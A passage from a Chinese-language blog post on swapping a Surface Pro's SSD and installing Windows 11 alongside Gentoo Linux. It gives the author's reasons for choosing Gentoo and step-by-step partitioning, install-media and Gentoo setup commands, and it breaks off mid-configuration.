<del>可能是偷工减料</del> ）微软为 Surface Pro 选用了 2230 规格的 SSD，这个规格的 SSD 并不好找，尤其是笔者目前肉身位于地大物穷的位于大洋彼岸离所有国家都很远的澳洲，找了半天<a href="https://cplonline.com.au/micron-mtfdkbk2t0qfm-1bd1aabyyr-2400-2tb-m-2-2230-nvme-ssd.html">才在 CPL 上找到一款镁光的 2230 规格的 2TB SSD</a>，虽然商品页面写着 <code>NOT Compatible with Surface Pro 8/9</code> ，但是<strong>在笔者看来理论上来说不兼容的情况不太可能发生</strong>，同时笔者在微软社区上找到了 <a href="https://answers.microsoft.com/en-us/surface/forum/all/what-is-the-max-ssd-my-surface-pro8-will-accept/4cf1ff6d-0bb8-415a-a4b9-690e31808f34">一篇成功在 Surface Pro 8 上安装这一款 SSD 的帖子</a>，那“不兼容”一说想来应当是无稽之谈（又或者是微软的商业手段，<strong>事实证明确实是可以兼容的</strong>），因此笔者选了一个风和日丽 <del>但其实下着细雨</del> 的日子前往墨尔本的某家 CPL 线下门店取到了这款 SSD （ <del>是的这就是发达国家比较常见的购物方式，没有国内那样发达的物流网络说实话👴感觉买啥都不方便，当然出来活动活动筋骨也是好的</del> ）</p><p><img src="https://s2.loli.net/2024/04/27/q3giJxNV9ZpvrIS.png" alt="价格比国内贵上好几百 RMB，澳洲的大部分电子产品都是如此"></p><p>接下来是对系统发行版的选择，Windows 自然不用说直接装最新的 Win 11，那么 Linux 该选择哪一种发行版呢？首先考虑比较贴近上游的 Linux 发行版——</p><ul><li>出于瞎折腾的角度考虑 <code>Arch Linux</code> 自然是提供了一定的折腾空间以及 AUR 的海量软件包，在为系统带来极高的可定制性的同时你几乎可以在 AUR 上找到任何软件</li><li><code>Fedora Workstation</code> 作为 RHEL 的试验田同时也是 Linus 所用的发行版在紧贴上游的同时提供了不弱于 Arch 的先进性，有着来自红帽的强大技术支持，软件更新比一部分滚动发行版还要激进，  <del>更是能第一时间当 RedHat 的小白鼠</del></li><li><code>openSUSE Tumbleweed</code> 则有着 SUSE 那来自德国人的精确与严谨，在兼顾稳定性的同时保持了滚动更新紧贴上游（更有着 Slowroll 这样等着 Tumbleweed 滚稳了再更新的“慢滚”发行版），YaST 更像一个温柔的大姐姐一样能帮你轻松解决相当多的各类需求， <em>因此这也是笔者的主力笔记本所使用的 Linux 发行版</em></li></ul><p><img src="https://s2.loli.net/2024/04/30/62x7yCpgKwqOYHj.png" alt="熟悉笔者的都知道笔者一直都是 SUSE 批.jpg"></p><p>虽然这些都是笔者比较喜欢的发行版，但思来想去笔者还是决定安装一个不太常规的 Linux 发行版—— <a href="https://gentoo.org/">Gentoo Linux</a> ，最直接的原因就是<strong>这是一个少有的原生从源码安装软件包的滚动 Linux 发行版</strong> ，任何软件都需要自行在自己的机器上进行编译，<strong>这意味着所有人的软件的二进制包都是不一样的</strong>，虽然说这与目前软工业界所追求的<a href="https://en.wikipedia.org/wiki/Reproducible_builds">“逐位可重复构建”</a> 似乎完全背道而驰，但从软件安全的角度考虑这意味着 <em>哪怕你知道我的电脑上的某个软件中存在二进制漏洞，你也无法直接通过传统的常规 pwn 手法进行攻击</em>  ，这主要是出于一个原因： <strong>现有的漏洞利用方法通常是控制流劫持导向的，针对软件二进制漏洞利用的方式通常是劫持控制流后再利用软件中原有的代码片段构建执行链完成任意代码执行</strong> ，例如现在针对不同程序的不同版本中存在的某一漏洞进行攻击的办法通常是辨别目标软件版本后利用 ROPgadget 或是其他的一些工具来拼凑 ROP chain ，而这样的攻击方法的可行性得以成立的原因则是包括内核在内的软件二进制通常是由软件源侧完成编译后再分发给用户，这意味着在同一发行版上使用同一版本软件的用户所持有的二进制文件都是相同的，因此对于攻击者而言获取相应软件的二进制文件基本上是没什么难度的， <strong>而所有软件都自行编译则可以很大程度上加大攻击者在传统攻击面的攻击难度</strong> ——这在很大程度上满足了笔者的精神洁癖：）</p><blockquote><p>当然可能有人会抬杠说这没什么意义，毕竟现在 <a href="https://arxiv.org/pdf/2401.17618">exploit technique 前沿都在各种 data-only attack</a> ，仅是阻挡攻击者获取 code gadget 的方式是无法完成 100% 的防护的， 可能也有人会抬杠说 <a href="https://www.intel.com/content/dam/develop/external/us/en/documents/catc17-introduction-intel-cet-844137.pdf">把 CET 开上不就完事了</a> ， <strong>但对笔者而言能有一定程度的提升那就是有意义的，在笔者看来这并非仅有 0 和 100 的区别</strong> ，同时对于攻击者而言针对所有软件都单独开发 data-only 的攻击手法未免成本就太高了，目前的这类研究还仅集中在操作系统内核或是其他大型软件上</p><p>此外，形如 <a href="https://clang.llvm.org/docs/ControlFlowIntegrity.html">CFI</a> 这样的防御手法在发行版分发的二进制软件包中很多都是未必开启的，而 Gentoo 这样自定义软件编译选项的发行版可以让你快速在系统各个软件中应用这些防护手段，同时定制自己所想要的优化选项，可能不是最好的，但是<strong>从精神层面而言一定是最适合自己的</strong></p><p> 那又有人可能会说每个开源软件都自己手工拉源码编译不就好了干嘛一定要用 Gentoo，笔者的评价是：</p><p><img src="https://s2.loli.net/2024/05/09/EfglUGYtAqpTSmz.png" alt="男人，什么罐头我说，曼巴出去"> </p></blockquote><p>当然，除了<strong>可以基于自身需求高度定制</strong>这个核心动机以外，Gentoo 有着一个强大的包管理器：<a href="https://wiki.gentoo.org/wiki/Portage">Portage</a> ，通过配置 <code>USE flag</code> 可以按照需求去编译软件包，实现 <strong>如无必要，勿增实体</strong> 的哲学（例如你需要使用的部分软件带有 kde 支持，但你其实并不使用 kde，那么只需要在 <code>/etc/portage/make.conf</code> 中添加 <code>USE=&quot;-kde&quot;</code>  这一 flag，这是一个全局性的例子；又或者对于某些软件包你想要启用&#x2F;禁止某些支持而并不想要把这样的配置全局化，你只需要在 <code>/etc/portage/package.use</code> 目录下创建新配置文件来为指定程序声明 USE 标记，例如 <code>kde-plasma/plasma-meta qt5 -sddm</code> 将为 KDE Plasma 桌面编译上 QT 支持的同时不使用 SDDM；当然，<a href="https://blog.xupeng.me/2006/10/10/met-problem-of-circular-dependencies-with-gentoo/">滥用 USE flags 有可能会来带循环依赖的问题</a>，那这又是另外一件事情了…）， <a href="https://wiki.gentoo.org/wiki/Selected-packages_set_(Portage)">world file</a> 的存在也大幅增添了系统的可重复构建性（硬要说的话在可复现性上肯定比不过 NixOS，但笔者对于 NixOS 这类“不可变系统”的概念说实话不太感冒，反倒觉得对于桌面用户而言这增添了不少没必要的麻烦，不过多学习一门 DSL 倒其实是无所谓的事情，毕竟 reproducible 的体验某种程度上真的很香，但 NixOS 对于笔者而言还有一点劝退的便是 non-FHS compliance ，虽然说 NixOS 可用的软件包确实是数一数二的多，但这样的系统构造在笔者看来并不够优雅）</p><p>最重要的是，<a href="https://en.wikipedia.org/wiki/Richard_Stallman">Richard Stallman</a> 曾经说过：Install Gentoo——</p><p><img src="https://s2.loli.net/2024/04/30/jEKw7bCOu9rMhlD.png" alt="虽然他用的不是 Gentoo 而是 Trisquel.jpg"></p><p>于是在经历了各种思考之后，笔者最终选择在 Surface Pro 上尝试折腾一下 Gentoo Linux 这一个相对而言比较小众的发行版</p><h1 id="0x01-安装-Windows"><a href="#0x01-安装-Windows" class="headerlink" title="0x01. 安装 Windows"></a>0x01. 安装 Windows</h1><p>因为笔者是要用一块全新的硬盘替换掉原有的硬盘，因此系统安装需要重头开始（ <del>虽然实际上有一些已知的系统迁移方案，但是👴太懒了</del> ），因为 Windows 很容易对硬盘分区进行预期外的修改，所以在安装双系统的情况下笔者选择先安装 Windows 再安装 Linux</p><h2 id="替换硬盘"><a href="#替换硬盘" class="headerlink" title="替换硬盘"></a>替换硬盘</h2><p>因为我们后面安装 Linux 要关闭 Secure Boot，因此我们首先需要在设置中关闭 BitLocker，从而确保原硬盘的可用性</p><blockquote><p> 否则后面就只能上 <a href="https://aka.ms/myrecoverykey">https://aka.ms/myrecoverykey</a> 找原有密钥进行恢复了，如果没有登录过微软账户的话那就只能和原硬盘数据彻底说再见了……</p></blockquote><p><img src="https://s2.loli.net/2024/04/24/tIUp49yHldzxkm2.png" alt="这个过程会非常慢，因为 Surface 设备的性能极其拉胯"></p><p>接下来进 UEFI 中关闭 Secure Boot，在关机状态下按住音量增加键不动，之后再按一次电源键即可进入 Surface 的 UEFI 界面，找到 <code>Secure Boot Configuration</code> 选择 <code>None</code> 即可：</p><p><img src="https://s2.loli.net/2024/04/24/q8MC6dsJ5HN3ToX.png" alt="u1s1 Surface 的 UEFI 虽然简介但是凑凑的"></p><p>解锁之后每次开机都会显示一个大大的红色条和一个🔓：</p><p><img src="https://s2.loli.net/2024/04/24/eJkMLOUzrG8NAvl.jpg" alt="丑中丑设计，感觉不如把🔓放在 Win logo 旁边并排"></p><p>然后在关机状态下用手机取卡针在背面的小孔一戳就能更换硬盘了，从 Surface Pro 8 开始微软的设备有了一定的可维护性，不过需要注意的是硬盘螺丝的规格为不太常见的 <code>T3</code> 六角螺丝，以及在完成硬盘更换之后 <strong>需要插电才能开机</strong> ，不过无论是通过 surface connect 还是通过雷电 4 接口插电都是可行的</p><p><img src="https://s2.loli.net/2024/04/27/iQEMbORa8qcP12j.jpg" alt="当然，你也可以选择使用牙签"></p><blockquote><p>然而仅限于 Surface Pro 系列，也就是只有 Pro 8&#x2F;9&#x2F;10（在笔者编写此文时，Pro 10 仅有商业版） 能快捷更换硬盘，Laptop 等其他产品线依然需要繁琐的拆机流程，不过这个便捷拆解设计在笔者看来有点类似之前见过的 ThinkPad 的高端工作站才有的特性🤔 遗憾的是微软如今依然尚未支持更换内存条，<del>否则👴将成为微软的铁血卫士</del></p></blockquote><h2 id="使用-PE-启动盘进行安装"><a href="#使用-PE-启动盘进行安装" class="headerlink" title="使用 PE 启动盘进行安装"></a>使用 PE 启动盘进行安装</h2><blockquote><p>Windows ISO 在 <a href="https://www.microsoft.com/software-download/windows11">微软官网</a> 便能进行下载，这里就不再赘叙了</p></blockquote><p>接下来我们在可移动磁盘（如 U 盘、移动硬盘等设备）上创建 Windows 安装介质，不过由于官网下载的 ISO 镜像缺少了分区表，因此我们需要手动进行配置，在 Windows 上你可以很轻松地使用 <a href="https://rufus.ie/en/">RUFUS</a> 一类的工具完成这一工作，若你和笔者一样日常使用 Linux 作为工作系统，则暂时没有比较好的解决方案</p><p>不过好在使用 PE 启动盘进行安装已经是一个较为成熟的解决方案了，方便起见笔者选择直接使用现有的解决方案进行安装：）</p><p>需要注意的是在这个阶段<strong>触控屏和原装键盘触摸板都是无法使用的，你必须外接键鼠进行使用</strong></p><p><img src="https://s2.loli.net/2024/04/29/RJF6nfCQYvLuesG.png" alt="笔者很久以前自制的启动盘，事实证明这些工具虽然老但是都还挺好用"></p><p>之后就是正常进系统了，不过在更新完成之前<strong>原装键盘触摸板依旧用不了</strong>：</p><p><img src="https://s2.loli.net/2024/04/29/s851nuVo43KpmWj.jpg"></p><h2 id="Extra-手工创建安装介质（not-recommended）"><a href="#Extra-手工创建安装介质（not-recommended）" class="headerlink" title="Extra. 手工创建安装介质（not recommended）"></a>Extra. 手工创建安装介质（not recommended）</h2><p>如果你希望自己动手丰衣足食，则也可以参照这一节的内容，不过笔者不太推荐（<strong>比较浪费时间</strong>）</p><blockquote><p>主要原因是 Windows 安装镜像中并没有提供一个分区表，否则直接 <code>dd</code> 一把梭就好了：(</p></blockquote><p>首先使用 <code>parted</code> 新建分区，这里我们建立一个 GPT 分区表，并建立两个分区：</p><ul><li>一个 NTFS 分区：存放 Windows 安装镜像中的文件</li><li>一个 EFI 分区：存放<a href="https://github.com/pbatard/rufus/blob/master/res/uefi/uefi-ntfs.img">由 RUFUS 提供的 EFI 启动程序</a></li></ul><blockquote><p>为什么我们不选择直接拷贝 Win 镜像进 EFI 分区？虽然 Win 镜像本身便是一个可启动的 EFI 分区，但是其安装文件 <code>source/install.wim</code> 通常大于 UEFI specs 所支持的 fat32 文件系统所支持的最大文件大小（4G），虽然部分 OEM 的 UEFI 会额外有对 exFAT 或是 NTFS 的支持，但为了兼容性考虑我们还是选择 fat32，并使用第三方软件 RUFUS 所提供的 EFI 程序</p></blockquote><p>这里的 <code>/dev/sda</code> 为你的 U 盘设备路径，请自行辨别，需要注意的是<strong>NTFS 分区应当在第一位，EFI 分区在第二位</strong> ，否则会导致 <em>无法进行安装</em>  （提示缺少驱动）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo parted /dev/sda</span>                        <br>GNU Parted 3.6<br>Using /dev/sda<br>Welcome to GNU Parted! Type &#x27;help&#x27; to view a list of commands.<br>(parted) unit s                                                           <br>(parted) mktable gpt<br>Warning: The existing disk label on /dev/sda will be destroyed and all data on this disk will be lost. Do you<br>want to continue?<br>Yes/No? Yes                                                               <br>(parted) mkpart windows-iso ntfs 2048 16777215<br>(parted) mkpart efi fat32 16777216 33554432<br>(parted) set 2 esp on                                                     <br>(parted) set 2 boot on                                                    <br>(parted) name 1 Windows                                                   <br>(parted) name 2 EFI                                                       <br>(parted) quit<br>Information: You may need to update /etc/fstab.<br><br></code></pre></td></tr></table></figure><p>然后运行如下两条命令初始化 EFI 分区的文件系统：</p><blockquote><p>需要说明的是与 NTFS 相关的操作在 Linux 下都会特别慢（至少在笔者的机器上如此，这可能和 <code>ntfs-3g</code> 的性能相关），建议 <del>其实也只能</del> 耐心等待：）</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mkfs.ntfs /dev/sda1</span><br>Cluster size has been automatically set to 4096 bytes.<br>Initializing device with zeroes: 100% - Done.<br>Creating NTFS volume structures.<br>mkntfs completed successfully. Have a nice day.<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mkfs.fat -F 32 /dev/sda2</span>               <br>mkfs.fat 4.2 (2021-01-31)<br></code></pre></td></tr></table></figure><p>接下来将 ISO 中数据拷贝到 U 盘当中，再将 <a href="https://github.com/pbatard/rufus/blob/master/res/uefi/uefi-ntfs.img">RUFUS</a> 提供的 EFI 镜像拷贝到 EFI 分区即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">mkdir</span> /mnt/&#123;iso,efi,win&#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount ~/Downloads/Win11_23H2_Chinese_Simplified_x64v2.iso /mnt/iso/</span><br>mount: /mnt/iso: WARNING: source write-protected, mounted read-only.<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sda1 /mnt/win/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sda2 /mnt/efi/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cp</span> -r /mnt/iso/* /mnt/win/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo umount /mnt/iso</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount ~/Downloads/uefi-ntfs.img /mnt/iso/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cp</span> -r /mnt/iso/* /mnt/efi</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo umount /mnt/efi</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo umount /mnt/win</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo umount /mnt/iso</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">sync</span></span><br></code></pre></td></tr></table></figure><p>之后就能 <del>原神启动</del> 正常启动进入安装界面了，需要注意的是<strong>原装的键盘触摸板完全无法使用，因此你需要额外用扩展坞连接通用无驱键鼠</strong>：</p><blockquote><p>原装键鼠仅在 UEFI 启动阶段可用，目测是 Windows 官网默认的安装介质中并未带有对应的驱动</p></blockquote><p><img src="https://s2.loli.net/2024/04/27/tRg15behirlnsIU.jpg" alt="Windows，启动——"></p><blockquote><p>以及这个安装方式在笔者的电脑上并未成功，但是使用各种第三方的 PE 启动盘提供的第三方工具却能轻松完成， <del>👴只能说 Windows 官方的安装程序确实比较垃圾</del></p></blockquote><h1 id="0x02-安装-Gentoo-Linux"><a href="#0x02-安装-Gentoo-Linux" class="headerlink" title="0x02. 安装 Gentoo Linux"></a>0x02. 安装 Gentoo Linux</h1><p>完成 Windows 安装之后接下来是安装 Gentoo Linux，在开始之前别忘了在 Windows 上进入硬盘管理中划出一块完整的空间留给 Gentoo Linux 使用，这里笔者就不截图了：）</p><h2 id="创建安装介质"><a href="#创建安装介质" class="headerlink" title="创建安装介质"></a>创建安装介质</h2><p>在 <a href="https://www.gentoo.org/downloads/">Gentoo 官网上下载镜像后</a> 用 balenaEtcher 或是一些其他的软件或是直接 <code>dd</code> 往 U 盘里写都 ok，其中 <code>Minimal Installation CD</code> 和 Arch 一样只有命令行，而 <code>LiveGUI USB Image</code> 则带有一个图形环境，<strong>但是最后都是要敲命令行一步步安装</strong> ，只是带 GUI 的会有个 KDE 桌面让你能在 Konsole 中敲，方便开浏览器和联网 ：）</p><blockquote><p>以及别忘了在 Surface UEFI 中将 USB 调整为第一启动项</p></blockquote><p>进入桌面后只有一个 <a href="https://wiki.gentoo.org/wiki/Handbook:Main_Page">Gentoo Linux Handbook</a> 的快捷方式，而不似其他 Linux 发行版有引导式安装程序：</p><p><img src="https://s2.loli.net/2024/04/30/xaksIHeSrmup2VT.jpg" alt="需要注意的是 Surface 屏幕分辨率较高，建议调一下缩放后 logout 再重新进来"></p><h2 id="创建文件系统"><a href="#创建文件系统" class="headerlink" title="创建文件系统"></a>创建文件系统</h2><blockquote><p>网络连接笔者直接使用 KDE 组件完成了，习惯命令行的也可以尝试使用 <code>net-setup</code> </p></blockquote><p>首先我们先使用 <code>cfdisk</code> 对硬盘进行分区，按惯例建立四个新分区：</p><ul><li>EFI 分区（<code>fat32</code>，挂载在 <code>/boot/efi</code> ）：存放 EFI 启动程序（grub）</li><li>系统分区（ <code>ext4</code> ，挂载在 <code>/</code> ）：存放系统基本文件</li><li>数据分区（ <code>ext4</code> ，挂载在 <code>/home</code> ）：存放用户数据</li><li>SWAP 分区（<code>swap</code> ）：交换内存</li></ul><p>Surface 上仅有一块 SSD ，所以硬盘路径基本上定死为 <code>/dev/nvme0n1</code> ，如果你在其他有多块硬盘的机器上参照本文进行配置则注意识别自己想要安装的键盘</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">cfdisk /dev/nvme0n1</span><br></code></pre></td></tr></table></figure><blockquote><p>注：这一步使用 LiveGUI CD 中的 KDE Partitioner 或是 GParted 也可以</p></blockquote><p><img src="https://s2.loli.net/2024/04/30/y6X4YeOlGKPbNkC.jpg" alt="100M 是 Windows 分区弄错了留下来的一个多余的无用空间，因为 NTFS 没法前扩所以笔者也懒得管了"></p><p>接下来创建文件系统，惯例地 <code>mkfs</code> 一把梭，开始之前最好先 <code>fdisk -l</code> 再辨别一下自己想要格式化的分区：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">mkfs.fat -F 32 /dev/nvme0n1p4</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mkfs.ext4 /dev/nvme0n1p5</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mkswap /dev/nvme0n1p6</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">swapon /dev/nvme0n1p6</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mkfs.ext4 /dev/nvme0n1p7</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/04/30/FCveHV8alMDSgPW.jpg" alt="日志输出太长了，没法拍完屏，将就看看"></p><p>最后就是挂载文件系统了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> /mnt/gentoo</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount /dev/nvme0n1p5 /mnt/gentoo</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> /mnt/gentoo/boot</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> /mnt/gentoo/boot/efi</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> /mnt/gentoo/home</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount /dev/nvme0n1p4 /mnt/gentoo/boot/efi</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount /dev/nvme0n1p7 /mnt/gentoo/home</span><br></code></pre></td></tr></table></figure><h2 id="安装-Stage-3"><a href="#安装-Stage-3" class="headerlink" title="安装 Stage 3"></a>安装 Stage 3</h2><p><code>Stage</code> 可以简单理解为构建 Gentoo Linux 系统的各个不同阶段：</p><ul><li><code>Stage 1</code> ：通常仅 Gentoo 内部开发人员使用，由一个基本的 <code>packages,build</code> 文件生成的系统包</li><li><code>Stage 2</code> ：通常仅 Gentoo 内部开发人员使用，从 Stage 1 编译而来的可以自举的工具链</li><li><code>Stage 3</code> ：由 Stage 2 编译而来的文件，并包含一组  <a href="https://wiki.gentoo.org/wiki/System_set_(Portage)">@system set</a> 软件包</li><li><code>Stage 4</code> ：在 Stage 3 基础上安装好的完整的 Gentoo 系统</li></ul><p>首先我们将 <a href="https://www.gentoo.org/downloads/">Stage 3</a> 下载到文件系统根目录下解压，笔者比较习惯 systemd 所以还是选择 systemd + desktop 版的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cd</span> /mnt/gentoo</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">wget https://distfiles.gentoo.org/releases/amd64/autobuilds/20240428T163427Z/stage3-amd64-desktop-systemd-20240428T163427Z.tar.xz</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">tar xpvf stage3-*.tar.xz --xattrs-include=<span class="hljs-string">&#x27;*.*&#x27;</span> --numeric-owner</span><br></code></pre></td></tr></table></figure><p>然后是配置机器时间：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">chronyd -q</span><br></code></pre></td></tr></table></figure><p>接下来配置编译选项，Portage 在运行时会读取一个 <code>make.conf</code> 配置文件，位于文件系统根目录下的 <code>/etc/portage/make.conf</code> 当中，Stage 3 文件中已经给我们提供好了一个空白模板，其中主要是一些编译参数与选项，我们只需要根据自身习惯进行修改即可：</p><blockquote><p>一般来说只需要在 <code>COMMON_FLAGS</code> 中添加 <code>-march=native</code> 以告诉编译器选择当前的系统体系结构，此时 GCC 会自动调查 CPU 并配置合适的 flag，但若是当前机器正在为其他机器编译时则不应当启用该项</p><p>对于内存比较小的设备，则不应当启用 <code>-pipe</code> 编译选项，因为这使用管道而非文件来存放编译中间文件，而这将占用更多的内存，从而导致编译器可能被 kill 掉而编译失败</p><p>其他的可用选项可以参照 <a href="https://wiki.gentoo.org/wiki//etc/portage/make.conf">Gentoo wiki</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">vim ./etc/portage/make.conf</span><br></code></pre></td></tr></table></figure><h2 id="安装基本系统"><a href="#安装基本系统" class="headerlink" title="安装基本系统"></a>安装基本系统</h2><p>接下来复制 DNS 信息，从而确保 chroot 之后有网可用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cp</span> --dereference /etc/resolv.conf /mnt/gentoo/etc/</span><br></code></pre></td></tr></table></figure><p>接下来挂载一些必要的文件系统并 chroot 到根目录，也可以直接通过 <code>arch-chroot /mnt/gentoo</code> 命令完成：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --types proc /proc /mnt/gentoo/proc</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --rbind /sys /mnt/gentoo/sys</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --make-rslave /mnt/gentoo/sys</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --rbind /dev /mnt/gentoo/dev</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --make-rslave /mnt/gentoo/dev</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --<span class="hljs-built_in">bind</span> /run /mnt/gentoo/run</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mount --make-slave /mnt/gentoo/run</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">chroot</span> /mnt/gentoo /bin/bash</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">source</span> /etc/profile</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">export</span> PS1=<span class="hljs-string">&quot;(chroot) <span class="hljs-variable">$&#123;PS1&#125;</span>&quot;</span></span><br></code></pre></td></tr></table></figure><p>接下来配置 Portage 仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> --parents /etc/portage/repos.conf</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cp</span> /usr/share/portage/config/repos.conf /etc/portage/repos.conf/gentoo.conf</span><br></code></pre></td></tr></table></figure><p>接下来安装 Gentoo ebuild 数据库快照：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge-webrsync</span><br></code></pre></td></tr></table></figure><blockquote><p>（可选配置：选择镜像站）</p><p>若有需要，则可以使用 <code>mirrorselect</code> 这个工具来手动选择想要使用的镜像源（空格键选中后 enter，可以选多个项），本质上是往 <code>make.conf</code> 中写入新的 <code>GENTOO_MIRRORS</code> 变量：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask --verbose --oneshot app-portage/mirrorselect</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mirrorselect -i -o &gt;&gt; /etc/portage/make.conf</span><br></code></pre></td></tr></table></figure></blockquote><p>接下来配置系统的 <code>profile</code> （决定了系统的默认配置，例如 <code>USE</code> 和 <code>CFLAGS</code> 等），第一条命令用来查看可用配置，第二条则进行选择，这里笔者选择了 <code>default/linux/amd64/23.0/desktop/plasma/systemd</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect profile list</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect profile <span class="hljs-built_in">set</span> 28</span><br></code></pre></td></tr></table></figure><blockquote><p>（可选配置：添加二进制包源）</p><p>众所周知 gentoo 是个几乎任何东西都要自行编译的发行版，如果你不想在当前机器上进行编译，而想要像其他发行版那样直接拿二进制可执行文件，则可以配置一个 <code>binary package host</code> ，这可以是你的另一台 Gentoo 机器，也可以是官方或是其他人的源</p><p>源地址需要写在 <code>/etc/portage/binrepos.conf/gentoobinhost.conf</code> 文件中，这是官方给的一个例子：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span 